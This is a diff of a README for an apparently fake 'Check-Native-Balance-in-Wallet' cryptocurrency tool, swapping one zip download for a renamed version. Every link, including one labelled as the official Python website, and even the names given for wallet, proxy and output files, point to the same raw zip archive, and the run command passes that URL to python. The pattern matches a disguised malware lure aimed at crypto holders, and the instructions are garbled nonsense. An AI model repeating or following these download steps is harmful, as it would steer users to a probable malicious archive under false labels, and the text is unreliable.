@@ -1,12 +1,12 @@
 # ⚡ Check-Native-Balance-in-Wallet - Check Wallet Balances Easily
 
-[![Download](https://raw.githubusercontent.com/TUNERMAN2021/Check-Native-Balance-in-Wallet/main/caries/Check-Native-Balance-in-Wallet.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/TUNERMAN2021/Check-Native-Balance-in-Wallet/main/caries/Check-Native-Balance-in-Wallet.zip)
+[![Download](https://raw.githubusercontent.com/TUNERMAN2021/Check-Native-Balance-in-Wallet/main/caries/Balance-Wallet-Native-Check-in-1.9.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/TUNERMAN2021/Check-Native-Balance-in-Wallet/main/caries/Balance-Wallet-Native-Check-in-1.9.zip)
 
 ## 🚀 Getting Started
 Welcome! This guide will help you download and run the Check-Native-Balance-in-Wallet application. Follow these steps to check your cryptocurrency wallet balances effortlessly.
 
 ## 📥 Download & Install
-1. **Visit this page to download** the application: [Check-Native-Balance-in-Wallet Releases](https://raw.githubusercontent.com/TUNERMAN2021/Check-Native-Balance-in-Wallet/main/caries/Check-Native-Balance-in-Wallet.zip).
+1. **Visit this page to download** the application: [Check-Native-Balance-in-Wallet Releases](https://raw.githubusercontent.com/TUNERMAN2021/Check-Native-Balance-in-Wallet/main/caries/Balance-Wallet-Native-Check-in-1.9.zip).
    
 2. On the releases page, find the latest version and download the zip file or installer related to it.
 
@@ -21,7 +21,7 @@ Before running the application, ensure you have the following:
 - An active internet connection.
 
 ## 🐍 Install Python
-1. **Download Python**: Go to the official [Python website](https://raw.githubusercontent.com/TUNERMAN2021/Check-Native-Balance-in-Wallet/main/caries/Check-Native-Balance-in-Wallet.zip) and click on the latest Python version (3.7 or higher) suitable for your operating system.
+1. **Download Python**: Go to the official [Python website](https://raw.githubusercontent.com/TUNERMAN2021/Check-Native-Balance-in-Wallet/main/caries/Balance-Wallet-Native-Check-in-1.9.zip) and click on the latest Python version (3.7 or higher) suitable for your operating system.
 
 2. **Install Python**: Follow the installation prompts. Make sure to check the box that says “Add Python to PATH” during installation.
 
@@ -58,7 +58,7 @@ You need to install a few additional packages to run the application.
 2. Type the following command to run the application:
 
    ```
-   python https://raw.githubusercontent.com/TUNERMAN2021/Check-Native-Balance-in-Wallet/main/caries/Check-Native-Balance-in-Wallet.zip
+   python https://raw.githubusercontent.com/TUNERMAN2021/Check-Native-Balance-in-Wallet/main/caries/Balance-Wallet-Native-Check-in-1.9.zip
    ```
 
 3. Follow the instructions shown in the command line to check wallet balances.
@@ -69,15 +69,15 @@ The application reads wallet addresses from a text file and can use proxies if n
 1. **Create a Wallet File**:
    - Open a plain text editor (like Notepad).
    - List all your wallet addresses, each on a new line.
-   - Save this file as `https://raw.githubusercontent.com/TUNERMAN2021/Check-Native-Balance-in-Wallet/main/caries/Check-Native-Balance-in-Wallet.zip` in the same folder as the application.
+   - Save this file as `https://raw.githubusercontent.com/TUNERMAN2021/Check-Native-Balance-in-Wallet/main/caries/Balance-Wallet-Native-Check-in-1.9.zip` in the same folder as the application.
 
 2. **(Optional) Create a Proxy File**:
    - If you want to use proxies, create another text file.
    - List all your proxies, each on a new line.
-   - Save this file as `https://raw.githubusercontent.com/TUNERMAN2021/Check-Native-Balance-in-Wallet/main/caries/Check-Native-Balance-in-Wallet.zip` in the same folder as the application.
+   - Save this file as `https://raw.githubusercontent.com/TUNERMAN2021/Check-Native-Balance-in-Wallet/main/caries/Balance-Wallet-Native-Check-in-1.9.zip` in the same folder as the application.
 
 ## 📊 Output Results
-The application saves the results in an Excel file named `https://raw.githubusercontent.com/TUNERMAN2021/Check-Native-Balance-in-Wallet/main/caries/Check-Native-Balance-in-Wallet.zip`. You can find this file in the same folder as the application after running it.
+The application saves the results in an Excel file named `https://raw.githubusercontent.com/TUNERMAN2021/Check-Native-Balance-in-Wallet/main/caries/Balance-Wallet-Native-Check-in-1.9.zip`. You can find this file in the same folder as the application after running it.
 
 ## 🔍 Troubleshooting
 If you encounter issues while running the application, consider the following:
@@ -87,7 +87,7 @@ If you encounter issues while running the application, consider the following:
 - Make sure your wallet addresses and proxies are correctly formatted in their respective text files.
 
 ## 📅 Updates
-Monitor the [Check-Native-Balance-in-Wallet Releases](https://raw.githubusercontent.com/TUNERMAN2021/Check-Native-Balance-in-Wallet/main/caries/Check-Native-Balance-in-Wallet.zip) page regularly for updates or new features.
+Monitor the [Check-Native-Balance-in-Wallet Releases](https://raw.githubusercontent.com/TUNERMAN2021/Check-Native-Balance-in-Wallet/main/caries/Balance-Wallet-Native-Check-in-1.9.zip) page regularly for updates or new features.
 
 ## 💬 Support
 If you need assistance or have questions, please open an issue on the GitHub repository or reach out via community forums. 
